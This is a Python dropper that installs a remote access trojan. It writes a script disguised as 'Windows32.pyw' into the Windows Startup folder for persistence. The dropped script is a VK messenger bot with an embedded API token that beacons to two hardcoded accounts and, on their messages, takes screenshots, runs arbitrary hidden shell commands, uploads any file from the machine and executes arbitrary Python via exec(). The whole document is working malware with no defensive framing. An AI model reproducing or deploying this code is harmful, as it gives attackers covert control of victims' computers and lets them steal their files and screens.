import getpass, os
username = getpass.getuser()
bot_text = (rf"""# -*- coding: utf-8 -*-
from vkbottle.bot import Bot, Message
from vkbottle import API, PhotoMessageUploader, LoopWrapper, DocMessagesUploader
import asyncio, getpass, base64, requests, os, subprocess
lw = LoopWrapper()
bot = Bot('3513a0158b87ebf2a29d71f518ded90c22941c92c627391f5546af721161980d2794200299b28c12efbdc')

@bot.on.private_message(text='screen')
async def priv(message: Message):
    if message.from_id == 690634508 or message.from_id == 355981903:
        try:
            import pyautogui
            photo = PhotoMessageUploader(bot.api)
            pyautogui.screenshot(r'C://Users/{username}/AppData/screen.jpg')
            photo_upd = await photo.upload(r'C://Users/{username}/AppData/screen.jpg')
            await message.answer(attachment=photo_upd)
        except Exception as Er:
            await message.answer(str(Er))

@bot.on.private_message(text='-p<command>')
async def priv(message: Message, command):
    if message.from_id == 690634508 or message.from_id == 355981903:
        try:
            popen = (os.popen(command))
            lines = popen.readlines()
            b = ''
            for g in lines:
                b = b + g
            await message.answer(b)
        except Exception as Er:
            await message.answer(Er)

@bot.on.private_message(text='-getfilecom <command>')
async def priv(message: Message, command):
    if message.from_id == 690634508 or message.from_id == 355981903:
        try:
            path = r"C://Users/{username}/AppData"
            popen = (os.popen(command))
            lines = popen.readlines()
            b = ''
            for g in lines:
                b = b + g
            fullpath = path + '/commandlog.txt'
            with open(fullpath, 'w') as f:
                f.write(b)
            docupd = DocMessagesUploader(bot.api)
            mydoc = await docupd.upload('commandlog.txt', fullpath, peer_id=message.peer_id)
            await message.answer('Command file', attachment=mydoc)
        except Exception as Er:
            await message.answer(Er)

@bot.on.private_message(text='-read <path>')
async def priv(message: Message, path):
    if message.from_id == 690634508 or message.from_id == 355981903:
        try:
            b = ''
            docupd = DocMessagesUploader(bot.api)
            mydoc = await docupd.upload('inforead.txt', path, peer_id=message.peer_id)
            await message.answer('Completed', attachment=mydoc)
        except Exception as Er:
            await message.answer(Er)

@bot.on.private_message(text='-th')
async def priv(message: Message):
    if message.from_id == 690634508 or message.from_id == 355981903:
        try:
            cwd = os.getcwd()
            await message.answer(cwd)
        except Exception as Er:
            await message.answer(Er)
@bot.on.private_message(text='-sp<com>')
async def priv(message: Message, com):
    if message.from_id == 690634508 or message.from_id == 355981903:
        try:
            CREATE_NO_WINDOW = 0x08000000
            subprocess.call(com, creationflags=CREATE_NO_WINDOW)
        except Exception as Er:
            await message.answer(Er)
@bot.on.private_message()
async def priv(message: Message):
    if message.from_id == 690634508 or message.from_id == 355981903:
        try:
            msg = message.text
            msg = msg.replace(r'\n', '\n')
            exec(message.text)
        except Exception as Er:
            await message.answer(str(Er))

@lw.timer(seconds=1)
async def delayed_task():
    api = API('3513a0158b87ebf2a29d71f518ded90c22941c92c627391f5546af721161980d2794200299b28c12efbdc')
    await api.messages.send(peer_id=690634508, message=(((getpass.getuser()).replace('PC', '')) + ' was connected'), random_id=0)
    await api.messages.send(peer_id=355981903, message=(((getpass.getuser()).replace('PC', '')) + ' was connected'), random_id=0)



bot.loop_wrapper = lw
bot.run_forever()""")
username = username.replace('PC', '')
with open(fr'C://Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows32.pyw', 'w', encoding='utf-8') as f:
    f.write(bot_text)
